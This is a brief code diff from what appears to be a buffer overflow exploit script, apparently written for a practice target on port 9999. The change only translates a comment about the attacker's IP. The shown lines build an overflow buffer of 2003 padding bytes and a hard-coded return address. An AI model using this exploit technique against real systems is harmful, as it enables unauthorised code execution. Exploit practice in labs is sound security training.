@@ -2,7 +2,7 @@
 import sys
 import socket
 
-ip = "192.168.0.39" # CAMBIA ESTO y pon la ip de tu pc atacante aqui
+ip = "192.168.0.39" # CHANGE THIS - put your attacker machine IP here
 port = 9999
 
 buffer = b"A" * 2003 + b"\xaf\x11\x50\x62"
